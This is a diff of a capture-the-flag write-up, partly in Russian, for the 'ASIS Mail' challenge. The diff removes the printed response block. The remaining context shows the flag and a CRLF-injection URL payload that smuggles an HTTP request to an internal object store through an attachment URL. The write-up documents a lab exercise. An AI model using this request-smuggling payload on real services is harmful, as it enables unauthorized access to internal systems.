@@ -1,4 +1,4 @@
-# ASIS Mail — райтап (objectstore через `attachment_url`)
+# ASIS Mail — writeup
 
 **Флаг:** `ASIS{M4IL_4S_4_S3RVIC3_15UUUUUUE5_62ee9c3cc5029d4c}`
 
@@ -75,14 +75,7 @@ http+post://objectstore:8082/FLAG%20HTTP/1.1%0d%0aHost:%20objectstore%0d%0a%0d%0
 
 Скачанное вложение содержит:
 
-```http
-{"error":"authorization required"}
-HTTP/1.1 200 OK
-Content-Disposition: attachment; filename=flag-0750c96cfc2bd4b665865da15e9d5b94.txt
-Content-Type: text/plain; charset=utf-8
 
-ASIS{M4IL_4S_4_S3RVIC3_15UUUUUUE5_62ee9c3cc5029d4c}
-```
 
 ---
 
